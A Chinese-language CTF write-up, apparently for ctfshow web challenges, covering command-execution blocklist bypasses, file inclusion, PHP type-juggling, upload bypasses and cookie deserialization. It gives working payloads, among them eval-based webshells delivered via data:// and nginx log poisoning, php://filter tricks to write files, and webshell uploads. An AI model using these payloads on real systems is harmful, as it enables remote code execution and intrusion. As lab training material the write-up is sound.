<h2 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>emmm 一样的直接绕 <code>/?c=tac%09fla?.ph?||ls</code><br>看题目的hint学到了另外的思路<br><code>nl&lt;fla&#39;&#39;g.php||</code></p>
<ul>
<li>nl: 列出文件内容 并加上行号(空白也加)</li>
<li>&lt;: 这里&lt;&#x3D;&gt;%09</li>
<li>‘’: 这里可绕过空格(实测双引号也行)</li>
</ul>
<p>这里自己试了试发现 <code>/?c=tac&lt;fla&#39;&#39;g.php||</code> 是可以绕过的  但是  <code>/?c=tac&lt;fla?.php||</code> 就不行了’(但我本地Linux又行…)</p>
<h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2><p>多过滤了个 %<br>可以用&lt;代替%09<br><code>/?c=tac&lt;fla&#39;&#39;g.php||</code></p>
<h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><p>多过滤%09 %26<br>还是一样的payload<br><code>/?c=tac&lt;fla&#39;&#39;g.php||</code></p>
<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><p><code>/?file=pHp://FilTer/convert.base64-encode/resource=flag.php</code></p>
<h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><p>多加了个对php的过滤<br>换data协议试试<br>跟着视频学到了一种方法<br><code>/?file=data://text/plain,&lt;?=eval($_POST[1]);?&gt;</code><br>这里因为过滤了php 所以采用短标签绕过<br>然后POST上传 <code>1=system(&quot;tac flag.php&quot;);</code> 注意分号<br>就可以绕过了</p>
<h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><p>在上题的基础上增加了 <code>str_replace(&quot;data&quot;, &quot;???&quot;, $file);</code><br>data伪协议也不能用了<br>又学到了神奇的绕过姿势 orz<br>视频利用的是日志注入漏洞<br><code>User-Agent: &lt;?php eval($_POST[1]);?&gt;</code><br>然后传 <code>/?file=/var/log/nginx/access.log</code><br>再POST即可<br>这里改为了 fl0g.php<br>tql 待会儿看看日志知识点 orz</p>
<h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><p>在上题的基础上增加了 <code>str_replace(&quot;:&quot;, &quot;???&quot;, $file);</code><br>用上题的日志注入一样可以绕过<br><code>/?file=/var/log/nginx/access.log</code><br>UA: <code>&lt;?=eval($_POST[1]);?&gt;</code><br>POST: <code>1=system(&quot;tac fl??.php&quot;);</code></p>
<h2 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里过滤了点号后就不能像上一题那样绕过了<br>这里完全没思路<br>贴两个学习链接<br><a href="https://www.freebuf.com/news/202819.html" target="_blank">here1</a><br><a href="https://xz.aliyun.com/t/10662" target="_blank">here2</a></p>
<h2 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里是如何绕过’死亡exit’的问题 <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a><br>可以用php:&#x2F;&#x2F;filter编码来绕过<br>文章写了三种思路:</p>
<ul>
<li>base64编码</li>
<li>strip_tags+base64 双过滤器</li>
<li>rot13</li>
</ul>
<p>这里简单一点直接用rot13转一下 让前面的php代码不执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">content=<span class="meta">&lt;?=</span> <span class="title function_ invoke__">flfgrz</span>(<span class="string">&quot;gnp sy*.*&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后对file&#x3D;后面内容二次url编码 这里要全字符编码 可以用脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    clearFlag = <span class="string">&quot;y&quot;</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> clearFlag == <span class="string">&quot;y&quot;</span> <span class="keyword">or</span> clearFlag == <span class="string">&quot;Y&quot;</span>:</span><br><span class="line">            os.system(<span class="string">&quot;cls&quot;</span>)</span><br><span class="line">        clearFlag = <span class="string">&quot;&quot;</span></span><br><span class="line">        string = <span class="built_in">input</span>(<span class="string">&quot;请输入需要转换的字符串 :&quot;</span>)</span><br><span class="line">        <span class="built_in">type</span> = <span class="built_in">input</span>(<span class="string">&quot;请选择操作类型(1：加密 2：解密) :&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span>(<span class="built_in">type</span> != <span class="string">&quot;1&quot;</span> <span class="keyword">and</span> <span class="built_in">type</span> != <span class="string">&quot;2&quot;</span>):</span><br><span class="line">            <span class="built_in">type</span> = <span class="built_in">input</span>(<span class="string">&quot;操作类型输入错误，请重新选择(1：加密 2：解密) :&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;1&quot;</span> :</span><br><span class="line">            encode_string = encode(string)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;编码结果为：&quot;</span>+encode_string+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;2&quot;</span> :</span><br><span class="line">            decode_string = decode(string)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;解码结果为：&quot;</span>+decode_string+<span class="string">&quot;【请注意前后空格】\n&quot;</span>)</span><br><span class="line">        clearFlag = <span class="built_in">input</span>(<span class="string">&quot;按Y/y清空屏幕继续:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#编码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">string</span>):</span><br><span class="line">    encode_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">        encode_char = <span class="built_in">hex</span>(<span class="built_in">ord</span>(char)).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;%&quot;</span>)</span><br><span class="line">        encode_string += encode_char</span><br><span class="line">    <span class="keyword">return</span> encode_string</span><br><span class="line"></span><br><span class="line"><span class="comment">#解码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">string</span>):</span><br><span class="line">    decode_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    string_arr = string.split(<span class="string">&quot;%&quot;</span>)</span><br><span class="line">    string_arr.pop(<span class="number">0</span>)           <span class="comment">#删除第一个空元素</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string_arr:</span><br><span class="line">        decode_char = <span class="built_in">chr</span>(<span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+char))</span><br><span class="line">        decode_string += decode_char</span><br><span class="line">    <span class="keyword">return</span> decode_string</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span></span><br></pre></td></tr></table></figure>
<p>执行后 访问2.php就可以得到flag了</p>
<h2 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>这里过滤了php但是没过滤冒号 所以可以用data伪协议+base64绕过<br>注意过滤了等号和加号 慢慢调字符和个数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac *.php&#x27;</span>);<span class="keyword">echo</span> <span class="string">&#x27;abcd&#x27;</span>;<span class="meta">?&gt;</span>aa</span><br><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTtlY2hvICdhYmNkJzs/PmFh</span></span><br></pre></td></tr></table></figure>

<h1 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h1><h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查了一手intval 发现一个很有趣的点<br>关于返回值  <code>成功时返回 var 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。</code><br>那么我们传一个非空数组就能绕过了<br><code>/?num[]=a</code></p>
<h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>利用php特性 传入 4476a也会被解析为4476<br><code>/?num=4476a</code></p>
<h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>查了查 带上m修饰符后匹配的是多行<br>所以我们可以通过换行符来绕过<br><code>/cmd=%0aphp</code></p>
<h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><p>这题和web90的区别在于这里的 $num&#x3D;&#x3D;4476 是弱类型比较<br>所以传 4476a绕不过<br>我的做法是 传科学计数法<br><code>/?num=4476e1</code><br>这样就能绕过了</p>
<h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里还过滤了字母<br>如果 base 是 0，通过检测 var 的格式来决定使用的进制：</p>
<ul>
<li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</li>
<li>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，</li>
<li>将使用 10 进制 (decimal)。</li>
</ul>
<p>所以我们以0开头 转换为8进制即可 010574<br><code>/?num=010574</code></p>
<h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这题我的做法是用 %0a 绕过strpos的限制<br><code>/?num=%0a010574</code><br>跟着题目hint还学习到了一种姿势:<br>不用进制 用小数绕过<br><code>/?num=4476.0</code></p>
<h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里把小数点也过滤掉了<br>这里由于必须要出现0且0不能在首位<br>我们只能在8进制的010574前尝试加特殊字符<br>尝试到 空格和+的时候发现可以绕过<br><code>/?num= 010574 or /?num= 010574</code><br>这里就做个小积累吧</p>
<h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>这 视频给了一种做法 直接传<br><code>?u=./flag.php</code><br>或者也可以用伪协议来读<br><code>?u=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>经典类型了<br>第一个是弱比较 第二个是强比较<br>POST上传 <code>a[]=1&amp;b[]=2</code> 即可</p>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><p>上传图片 尝试bp抓包发现在抓包之前就校验了<br>说明是前台校验<br>查看源代码 找到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;button type=<span class="string">&quot;button&quot;</span> <span class="class"><span class="keyword">class</span>=&quot;<span class="title">layui</span>-<span class="title">btn</span>&quot; <span class="title">id</span>=&quot;<span class="title">upload</span>&quot; <span class="title">lay</span>-<span class="title">data</span>=&quot;</span>&#123;url: <span class="string">&#x27;upload.php&#x27;</span>, accept: <span class="string">&#x27;images&#x27;</span>,exts:<span class="string">&#x27;png&#x27;</span>&#125;<span class="string">&quot;&gt;</span></span><br></pre></td></tr></table></figure>
<p>把exts里面的改为php即可上传成功<br>antsword连接即可找到flag.php</p>
<h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>这里在上一题基础上加了后端验证<br>将conten-type 改为  <code>image/png</code> 即可绕过<br>这里改为以前常用的 <code>image/jpeg</code> 不行  (猜是因为exts限制为了png?)<br>antsword连接或是进入php页面POST都可以得到flag</p>
<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><p>这 原来username 和 password 就是 <code>xxxxxx</code> 🤣<br>那直接传即可</p>
<h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><p>cookie中传 <code>user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code><br>注意这里要将序列化的urlencode一下<br>GET传 <code>/?username=xxxxxx&amp;password=xxxxxx</code></p>
<h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><p>把username和password改成不一样即可</p>
<h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><p>这样构造即可</p>
